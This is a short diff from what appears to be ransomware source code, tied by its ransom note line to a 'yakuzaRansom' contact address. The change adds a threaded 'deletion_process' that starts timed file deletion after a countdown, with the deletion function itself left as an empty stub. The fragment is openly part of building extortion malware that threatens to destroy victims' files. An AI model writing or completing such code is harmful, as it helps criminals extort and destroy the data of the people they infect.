@@ -1075,14 +1075,22 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
             except FileNotFoundError:
                 pass
 
-    # Step 54: Function to begin the deletion sequence
+    # Step 54: Function to begin the deletion sequence by execution deletion_process()
     def begin_deletion_sequence(self):
         if not self.stopDeletion:
             self.log("Time is up. Starting file deletion sequence.", "red")
             self.deletion_dialog = DeletionCountdownDialog(self, self. stop_deletion_process)
             self.deletion_process()
 
+
+    # Step 55: Function to handle the deletion process
     def deletion_process(self):
+        self.log("Deletion process started.", 'yellow')
+        self.deletionThread = Thread(target=self.delete_files_with_timing, daemon=True)
+        self.deletionThread.start()
+
+
+    def delete_files_with_timing(self):
         pass
 
 
